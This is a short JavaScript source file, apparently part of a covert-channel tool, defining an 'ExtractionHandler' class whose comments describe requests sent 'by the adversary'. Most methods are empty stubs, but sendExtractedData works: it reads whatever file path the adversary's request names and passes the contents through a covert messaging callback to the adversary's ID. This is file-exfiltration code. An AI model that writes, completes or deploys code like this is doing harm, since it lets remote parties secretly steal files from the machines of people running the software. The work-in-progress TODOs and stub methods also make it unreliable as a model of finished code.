/* eslint-disable linebreak-style */
const fs = window.require('fs');

/**
 * Manages and handles data extraction.
 *
 * @param {Object} request - Contains information sent by the adversary.
 */
export default class ExtractionHandler {
    /**
     * Dunno man, wtf.
     *
     * @param {Object} request - Is recieved data.
     */
    constructor(request) {
        this.request = request;
    }

    /**
     * Process extraction request.
     *
     * @returns {null}
     */
    _parseRequest() {

    }

    /**
     * Reply to the request based on information in configation object.
     *
     * @returns {null}
     */
    getResponse() {
        return {
            extraction: 'reply'
        };
    }

    /**
     * Send extracted data with defined data channel.
     *
     * @param {Function} covertChannelFunction - Callback of what will be implemented.
     * @param {Id} userId - ID of the aversary.
     * @returns {null}
     */
    sendExtractedData(covertChannelFunction, userId) {
        // TODO: Change completely.
        fs.readFile(this.request.path, 'utf8', (err, data) => {
            covertChannelFunction('sendEndpointTextMessage', userId, data);
            console.log('DATA SENT', this.request);
        });
    }
};